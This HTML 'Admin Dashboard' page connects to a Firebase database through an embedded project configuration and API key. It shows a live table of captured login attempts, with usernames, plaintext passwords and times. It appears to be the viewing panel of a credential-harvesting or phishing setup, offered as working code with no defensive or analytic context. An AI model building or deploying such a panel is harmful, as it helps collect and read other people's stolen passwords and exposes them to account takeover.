<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Admin Dashboard</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <h2>Login Attempts</h2>
  <table border="1" id="attemptsTable">
    <tr>
      <th>Username</th>
      <th>Password</th>
      <th>Time</th>
    </tr>
  </table>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyByANBjLzBtTAsGNOwSSz5uqJm6QYuaw-g",
      authDomain: "youuh-5d9e3.firebaseapp.com",
      databaseURL: "https://youuh-5d9e3-default-rtdb.firebaseio.com",
      projectId: "youuh-5d9e3",
      storageBucket: "youuh-5d9e3.firebasestorage.app",
      messagingSenderId: "772789757705",
      appId: "1:772789757705:web:a8e73acadfcaa4324795d8"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const table = document.getElementById('attemptsTable');

    db.ref('loginAttempts').on('child_added', (snapshot) => {
      const data = snapshot.val();
      const row = table.insertRow();
      row.insertCell(0).innerText = data.username;
      row.insertCell(1).innerText = data.password;
      row.insertCell(2).innerText = new Date(data.time).toLocaleString();
    });
  </script>
</body>
</html>
